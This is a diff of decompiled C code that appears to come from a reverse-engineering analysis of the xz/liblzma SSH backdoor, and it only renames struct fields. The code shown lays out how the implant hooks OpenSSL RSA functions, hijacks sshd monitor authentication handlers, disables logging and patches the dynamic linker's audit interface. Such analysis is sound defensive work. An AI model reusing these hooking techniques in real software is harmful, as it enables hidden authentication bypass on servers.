@@ -159,16 +159,16 @@ LAB_00105951:
                *(undefined1 *)((long)&(local_980.import_resolver)->alloc + loop_idx);
           loop_idx = loop_idx + 1;
         } while (loop_idx != 0x18);
-        local_a68.RSA_public_decrypt_plt = &local_ac0;
-        local_a68.EVP_PKEY_set1_RSA_plt = &local_ab8;
-        local_a68.RSA_get0_key_plt = &local_ab0;
-        local_a68.hooks_data_addr = params->hook_params->hooks_data_addr;
-        local_a68.data = &local_980;
+        local_a68.rsa_public_decrypt_slot = &local_ac0;
+        local_a68.evp_set1_rsa_slot = &local_ab8;
+        local_a68.rsa_get0_key_slot = &local_ab0;
+        local_a68.hooks_data_slot = params->hook_params->hooks_data_slot;
+        local_a68.shared_maps = &local_980;
         local_a68.elf_handles = elf_handles;
         local_a68.libc_imports = &local_980.libc_imports;
         BVar26 = process_shared_libraries(&local_a68);
         if (BVar26 == FALSE) goto LAB_00105a59;
-        local_b10 = *params->hook_params->hooks_data_addr;
+        local_b10 = *params->hook_params->hooks_data_slot;
         ctx = &local_b10->global_ctx;
         imported_funcs = &local_b10->imported_funcs;
         pgVar50 = ctx;
@@ -180,7 +180,7 @@ LAB_00105951:
         hooks_ctx = params->hook_params;
         (local_b10->global_ctx).imported_funcs = imported_funcs;
         (local_b10->global_ctx).sshd_ctx = &local_b10->sshd_ctx;
-        hooks_data_addr_ptr = hooks_ctx->hooks_data_addr;
+        hooks_data_addr_ptr = hooks_ctx->hooks_data_slot;
         (local_b10->global_ctx).libc_imports = &local_b10->libc_imports;
         pbVar51 = *hooks_data_addr_ptr;
         signed_data_size = pbVar51->signed_data_size;
@@ -203,9 +203,9 @@ LAB_00105951:
           }
           hooks_ctx = params->hook_params;
           (local_b10->ldso_ctx).imported_funcs = imported_funcs;
-          hook_RSA_get0_key = hooks_ctx->hook_RSA_get0_key;
-          (local_b10->ldso_ctx).hook_RSA_public_decrypt = hooks_ctx->hook_RSA_public_decrypt;
-          hook_EVP_PKEY_set1_RSA = params->shared->hook_EVP_PKEY_set1_RSA;
+          hook_RSA_get0_key = hooks_ctx->rsa_get0_key_hook;
+          (local_b10->ldso_ctx).hook_RSA_public_decrypt = hooks_ctx->rsa_public_decrypt_hook;
+          hook_EVP_PKEY_set1_RSA = params->shared->evp_set1_rsa_hook_entry;
           (local_b10->ldso_ctx).hook_RSA_get0_key = hook_RSA_get0_key;
           (local_b10->ldso_ctx).hook_EVP_PKEY_set1_RSA = hook_EVP_PKEY_set1_RSA;
           sshd_ctx_cursor = &local_b10->sshd_ctx;
@@ -214,17 +214,18 @@ LAB_00105951:
             sshd_ctx_cursor = (sshd_ctx_t *)((long)sshd_ctx_cursor + (ulong)zero_seed * -8 + 4);
           }
           (local_b10->sshd_ctx).mm_answer_authpassword_hook =
-               params->shared->mm_answer_authpassword_hook;
-          mm_answer_keyverify_fn = params->hook_params->mm_answer_keyverify;
-          (local_b10->sshd_ctx).mm_answer_keyallowed = params->hook_params->mm_answer_keyallowed;
+               params->shared->authpassword_hook_entry;
+          mm_answer_keyverify_fn = params->hook_params->mm_answer_keyverify_hook;
+          (local_b10->sshd_ctx).mm_answer_keyallowed =
+               params->hook_params->mm_answer_keyallowed_hook;
           (local_b10->sshd_ctx).mm_answer_keyverify = mm_answer_keyverify_fn;
           sshd_log_ctx = &local_b10->sshd_log_ctx;
           for (loop_idx = 0x1a; loop_idx != 0; loop_idx = loop_idx + -1) {
             sshd_log_ctx->logging_disabled = FALSE;
             sshd_log_ctx = (sshd_log_ctx_t *)((long)sshd_log_ctx + (ulong)zero_seed * -8 + 4);
           }
-          (local_b10->sshd_log_ctx).mm_log_handler = params->hook_params->mm_log_handler;
-          *params->shared->globals = ctx;
+          (local_b10->sshd_log_ctx).mm_log_handler = params->hook_params->mm_log_handler_hook;
+          *params->shared->global_ctx_slot = ctx;
           imported_funcs_cursor = imported_funcs;
           for (loop_idx = 0x4a; loop_idx != 0; loop_idx = loop_idx + -1) {
             *(undefined4 *)&imported_funcs_cursor->RSA_public_decrypt_orig = 0;
@@ -801,30 +802,31 @@ LAB_00106bf0:
                              ((void *)0x1,(secret_data_shift_cursor_t)0x145,0x78,0x18),
          BVar26 != FALSE)) &&
         ((BVar26 = secret_data_append_from_address
-                             (params->hook_params->symbind64,(secret_data_shift_cursor_t)0x12a,4,
-                              0x12), BVar26 != FALSE &&
+                             (params->hook_params->symbind64_handler,
+                              (secret_data_shift_cursor_t)0x12a,4,0x12), BVar26 != FALSE &&
          (BVar26 = secret_data_append_item
                              ((secret_data_shift_cursor_t)0x12e,0x13,4,0x20,
-                              (u8 *)params->hook_params->hook_RSA_public_decrypt), BVar26 != FALSE))
+                              (u8 *)params->hook_params->rsa_public_decrypt_hook), BVar26 != FALSE))
         )) && (BVar26 = secret_data_append_from_address
-                                  (params->shared->hook_EVP_PKEY_set1_RSA,
+                                  (params->shared->evp_set1_rsa_hook_entry,
                                    (secret_data_shift_cursor_t)0x132,6,0x14), BVar26 != FALSE)) &&
       ((BVar26 = secret_data_append_item
                            ((secret_data_shift_cursor_t)0x138,0x15,2,0x10,
-                            (u8 *)params->hook_params->hook_RSA_get0_key), BVar26 != FALSE &&
+                            (u8 *)params->hook_params->rsa_get0_key_hook), BVar26 != FALSE &&
        (BVar26 = secret_data_append_item
                            ((secret_data_shift_cursor_t)0xee,0x10,0x26,0x20,
-                            (u8 *)params->hook_params->mm_answer_keyallowed), BVar26 != FALSE)))) &&
-     ((BVar26 = secret_data_append_item
-                          ((secret_data_shift_cursor_t)0x140,0x17,5,0x20,
-                           (u8 *)params->hook_params->mm_answer_keyverify), BVar26 != FALSE &&
-      (((BVar26 = secret_data_append_item
-                            ((secret_data_shift_cursor_t)0x13a,0x16,6,0x20,
-                             (u8 *)params->shared->mm_answer_authpassword_hook), BVar26 != FALSE &&
-        (BVar26 = secret_data_append_item
-                            ((secret_data_shift_cursor_t)0x114,0x11,0x16,0x10,
-                             (u8 *)peVar34->elf_parse), BVar26 != FALSE)) &&
-       ((local_b10->global_ctx).num_shifted_bits == 0x1c8)))))) {
+                            (u8 *)params->hook_params->mm_answer_keyallowed_hook), BVar26 != FALSE))
+      )) && ((BVar26 = secret_data_append_item
+                                 ((secret_data_shift_cursor_t)0x140,0x17,5,0x20,
+                                  (u8 *)params->hook_params->mm_answer_keyverify_hook),
+             BVar26 != FALSE &&
+             (((BVar26 = secret_data_append_item
+                                   ((secret_data_shift_cursor_t)0x13a,0x16,6,0x20,
+                                    (u8 *)params->shared->authpassword_hook_entry), BVar26 != FALSE
+               && (BVar26 = secret_data_append_item
+                                      ((secret_data_shift_cursor_t)0x114,0x11,0x16,0x10,
+                                       (u8 *)peVar34->elf_parse), BVar26 != FALSE)) &&
+              ((local_b10->global_ctx).num_shifted_bits == 0x1c8)))))) {
     *(local_b10->ldso_ctx).libcrypto_l_name = (char *)local_b10;
     local_980.main_map = local_980.main_map + local_ac8 + 8;
     resolver_status = *(u32 *)local_980.main_map;
@@ -845,7 +847,7 @@ LAB_00106bf0:
       paVar57 = (audit_ifaces *)((long)paVar57 + (ulong)zero_seed * -8 + 4);
     }
     (local_b10->ldso_ctx).hooked_audit_ifaces.symbind =
-         (audit_symbind_fn_t)params->hook_params->symbind64;
+         (audit_symbind_fn_t)params->hook_params->symbind64_handler;
     *(local_b10->ldso_ctx)._dl_audit_ptr = audit_ifaces_ptr;
     *(local_b10->ldso_ctx)._dl_naudit_ptr = 1;
     loop_idx = 0;
